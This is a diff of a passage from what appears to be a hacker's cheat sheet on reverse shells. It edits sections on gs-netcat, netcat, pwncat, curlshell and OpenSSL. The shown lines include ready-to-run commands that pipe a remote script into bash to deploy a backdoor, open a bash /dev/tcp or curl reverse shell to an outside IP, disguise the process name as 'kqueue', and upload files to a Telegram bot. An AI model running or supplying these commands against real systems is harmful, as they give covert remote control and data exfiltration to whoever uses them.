@@ -1234,7 +1234,7 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 <a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat (encrypted)**
 
-Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
+Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
 
 ```sh
 X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/x)"
@@ -1255,6 +1255,12 @@ Start netcat to listen on port 1524 on your system:
 ```sh
 nc -nvlp 1524
 ```
+After connection, [upgrade](#reverse-shell-interactive) your shell to a fully interactive PTY shell. Alternatively use [pwncat-cs](https://pwncat.org/) instead of netcat:
+```sh
+pwncat -lp 1524
+# Press "Ctrl-C" if pwncat gets stuck after "registerd new host ...".
+# Then type "back" to get the prompt off the remote shell.
+```
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
@@ -1271,6 +1277,7 @@ bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 
 Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
 ```sh
+# On YOUR workstation
 # Generate SSL keys:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
 # Start your listening server:
@@ -1297,6 +1304,7 @@ C="curl -Ns telnet://3.13.3.7:1524"; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul
 **5.i.e. Reverse shell with OpenSSL (encrypted)**
 
 ```sh
+# On YOUR workstation:
 # Generate SSL keys:
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/CN=THC"
 # Start your listening server:
